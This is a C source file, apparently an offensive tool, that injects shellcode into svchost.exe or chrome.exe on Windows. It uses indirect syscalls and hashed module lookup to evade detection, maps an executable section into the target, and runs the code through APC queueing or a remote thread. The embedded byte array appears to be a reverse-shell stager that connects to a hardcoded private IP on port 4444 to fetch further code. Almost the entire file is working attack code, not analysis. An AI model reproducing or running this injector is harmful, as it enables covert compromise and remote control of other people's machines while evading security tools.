#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include "Sympho.h"
#include "HellsHall.h"

NTSTATUS STATUS;
#define ViewShare 1

typedef struct _MyStruct
{
	SysFunc NtMapViewOfSection;
	SysFunc NtCreateSection;
	SysFunc NtCreateThreadEx;
	SysFunc NtQueueApcThread;
	SysFunc NtQuerySystemInformation;
	SysFunc RtlAllocateHeap;
	SysFunc NtOpenProcess;
} MyStruct, * PMyStruct;

MyStruct S = { 0 };
PSYSTEM_PROCESS_INFORMATION sProcInfo = NULL;

BOOL Initialize() {

	RtlSecureZeroMemory(&S, sizeof(MyStruct));

	if (!InitilizeSysFunc("NtQuerySystemInformation")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtQuerySystemInformation);

	if (!InitilizeSysFunc("NtMapViewOfSection")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtMapViewOfSection);

	if (!InitilizeSysFunc("NtCreateSection")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtCreateSection);

	if (!InitilizeSysFunc("NtCreateThreadEx")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtCreateThreadEx);

	if (!InitilizeSysFunc("NtQueueApcThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtQueueApcThread);

	if (!InitilizeSysFunc("RtlAllocateHeap")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.RtlAllocateHeap);

	if (!InitilizeSysFunc("NtOpenProcess")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtOpenProcess);

	return TRUE;
}

// Fonction qui tente d'obtenir le handle du processus en fonction de son nom
HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
	int pPID = 0;
	ULONG sProcInfoL = 0;
	HANDLE hPID = NULL;
	OBJECT_ATTRIBUTES objstruct = { sizeof(objstruct) };
	CLIENT_ID clientId;

	// Loop through the processes
	while (sProcInfo->NextEntryOffset != 0) {
		if (sProcInfo->ImageName.Buffer != NULL) {
			if (wcscmp(sProcInfo->ImageName.Buffer, ProcessName) == 0) {
				pPID = sProcInfo->UniqueProcessId;

				// Attempt to open the process using NtOpenProcess
				clientId.UniqueProcess = (HANDLE)pPID;
				clientId.UniqueThread = NULL;

				SYSCALL(S.NtOpenProcess);
				if ((STATUS = HellHall(&hPID, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &objstruct, &clientId)) == 0) {
					// Successfully opened the process
					printf("[+] Found and successfully opened PID: %d\n", pPID);
					printf("Process handle at 0x%02X\n", hPID);
					*PID = pPID;
					return hPID;
				}
			}
		}
		sProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)sProcInfo + sProcInfo->NextEntryOffset);
	}
	return NULL; // No valid handle found
}

BOOL SettingMap(HANDLE* outSection, PVOID* outRemoteBase, HANDLE hProcess) {
#include <stdint.h>

	uint8_t payload[] = {
		 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48,
	0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x51, 0x56, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x8b,
	0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78,
	0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
	0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67,
	0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x8b, 0x48, 0x18,
	0x49, 0x01, 0xd0, 0x50, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48,
	0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48,
	0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1,
	0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
	0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49,
	0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,
	0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
	0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
	0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52,
	0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
	0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32,
	0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6,
	0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
	0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x32, 0x72,
	0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba,
	0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
	0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b,
	0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d,
	0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
	0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea,
	0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10,
	0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
	0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a,
	0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00, 0x00, 0x00,
	0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
	0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02,
	0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55,
	0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41,
	0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89,
	0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5,
	0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
	0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9,
	0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8,
	0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40,
	0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b,
	0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75,
	0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
	0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48,
	0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00,
	0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
	};

	HANDLE hMap = NULL;
	PVOID localBase = NULL;
	PVOID remoteBase = NULL;
	SIZE_T sPayload = sizeof(payload);
	SIZE_T viewSize = NULL;
	LARGE_INTEGER maxSize = { .HighPart = 0, .LowPart = sPayload };


	SYSCALL(S.NtCreateSection);
	if ((STATUS = HellHall(&hMap, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] Issue creating the section\n");
		return FALSE;
	}
	printf("[+] Section created\n");

	SYSCALL(S.NtMapViewOfSection);
	if ((STATUS = HellHall(hMap, GetCurrentProcess(), &localBase, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("Issue while mapping view locally\n");
		printf("NtMapViewOfSection failed with status: 0x%X\n", STATUS);
		return FALSE;
	}


	if (hMap != NULL) {
		*outSection = hMap;
	}
	else {
		printf("[-] Failed to create the map\n");
	}

	if (localBase == NULL) {
		printf("[!] Failed to map the view\n");
		return FALSE;
	}

	memcpy(localBase, payload, sizeof(payload));

	if ((STATUS = HellHall(hMap, hProcess, (PVOID*)&remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("Issue while mapping view remotely\n");
		return FALSE;
	}
	else {
		printf("File Mapped succesfuly with remote process at 0x%p\n", remoteBase);
		*outRemoteBase = remoteBase;
		return TRUE;
	}

	return TRUE;
}

VOID CALLBACK DummyAPCFunc(ULONG_PTR param) {
	BOOL* pExecuted = (BOOL*)param;
	*pExecuted = TRUE;
}

BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {

	int i = 0;
	volatile BOOL executed = FALSE;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Snapshot failed.\n");
		return FALSE;
	}

	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hSnapshot, &te32)) {
		CloseHandle(hSnapshot);
		return FALSE;
	}
	do {
		if (te32.th32OwnerProcessID == dwPID) {
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
			if (hThread) {
				// Trying the injection
				DWORD res = QueueUserAPC((PAPCFUNC)pRemoteShellcode, hThread, (ULONG_PTR)NULL);
				DWORD res2 = QueueUserAPC(DummyAPCFunc, hThread, (ULONG_PTR)&executed);
				if (res != 0) {
					printf("[+] APC queued on thread %lu\n", te32.th32ThreadID);
					i += 1;
				}
				if (res2 != 0) {
					printf("[+] DummyAPCFunc on thread %lu\n", te32.th32ThreadID);
					CloseHandle(hThread);
					break;
				}

			}
		}
	} while (Thread32Next(hSnapshot, &te32));
	CloseHandle(hSnapshot);
	if (i == 0) {
		return FALSE;
	}
	else {
		Sleep(1000);
		if (executed) {
			printf("[+] DummyAPCFunc executed successfully.\n");
			return TRUE;
		}
		else {
			printf("[-] DummyAPCFunc was not executed.\n");
			return FALSE;
		}
	}
	return TRUE;
}

BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
	HANDLE hThread = NULL;
	DWORD threadId = 0;

	hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)SleepEx,  // SleepEx(INFINITE, TRUE)
		(LPVOID)(TRUE),
		CREATE_SUSPENDED,
		&threadId
	);

	if (hThread == NULL) {
		printf("[!] Failed to create remote thread (SleepEx)\n");
		CloseHandle(hProcess);
		return FALSE;
	}

	printf("[+] Suspended thread created with TID: %lu\n", threadId);

	// Queue ton shellcode sur ce thread
	if (QueueUserAPC((PAPCFUNC)pBaseSection, hThread, NULL) == 0) {
		printf("[!] Failed to queue APC\n");
		CloseHandle(hThread);
		return FALSE;
	}

	printf("[+] APC queued successfully on thread %lu\n", threadId);

	// Maintenant que l'APC est queué, on relance le thread
	if (ResumeThread(hThread) == (DWORD)-1) {
		printf("[!] Failed to resume thread\n");
		CloseHandle(hThread);
		return FALSE;
	}

	printf("[+] Thread resumed, shellcode should execute now.\n");

	// Ferme le handle localement, l'exécution est déjà partie
	CloseHandle(hThread);
	return TRUE;
}


int main() {
	uint64_t expectedHash = 0x9B90848C8B008677; // NTDLL.DLL
	HMODULE hModule = GiveMeMyModule(expectedHash);
	HANDLE hSection = NULL;
	HANDLE hThread = NULL;
	PVOID pBaseSection = NULL;
	int PID = NULL;

	if (!hModule) {
		printf("Error Getting NTDLL\n");
		return -1;
	}
	else {
		printf("Nice finding NTDLL\n");
	}

	if (!Initialize()) {
		printf("bad Initialization\n");
		return -1;
	}

	ULONG sProcInfoL = 0;

	// Get system information (process list)
	SYSCALL(S.NtQuerySystemInformation);
	if ((STATUS = HellHall(SystemProcessInformation, NULL, 0, &sProcInfoL)) != 0x0 && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
		return -1;
	}

	if (STATUS == STATUS_INFO_LENGTH_MISMATCH) {
		sProcInfoL *= 2;
	}

	// Allocate memory for process information
	sProcInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(sProcInfoL);
	if (!sProcInfo) {
		printf("[!] Memory allocation failed\n");
		return -1;
	}

	// Query system information again
	if ((STATUS = HellHall(SystemProcessInformation, sProcInfo, sProcInfoL, NULL)) != 0x0) {
		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
		free(sProcInfo);
		return -1;
	}

	// Try to open svchost.exe first
	HANDLE hProcess = GiveMeMyProcessHandle(L"svchost.exe", &PID);
	if (hProcess == NULL) {
		// If not found, try to open chrome.exe
		printf("[!] No openable svchost.exe found. Trying chrome.exe...\n");
		hProcess = GiveMeMyProcessHandle(L"chrome.exe", &PID);
	}

	if (hProcess == NULL) {
		printf("[!] No openable svchost.exe or chrome.exe process found.\n");
		free(sProcInfo);
		return -1;
	}

	if (!SettingMap(&hSection, &pBaseSection, hProcess)) {
		printf("Failed to create map\n");
	}
	else if (pBaseSection != NULL && pBaseSection != 0) {
		printf("[+] Setup of the map successful at 0x%p\n", pBaseSection);
	}
	else {
		printf("Failed to create map\n");
	}

	// Getting a thread from the remote process
	printf("[i] Press Enter to execute the shellcode\n");
	getchar();
	if (!QueueShellcodeAPC((DWORD)PID, pBaseSection)) {
		printf("[i] Trying to inject a thread manually\n");
		if (!InjectShellcodeAPCmanually(hProcess, pBaseSection)) {
			printf("Failed to inject remote thread manually\n");
		}
		else {
			printf("Enjoy :)\n");
		}
	}
	else {
		printf("Enjoy :)\n");
	}


}
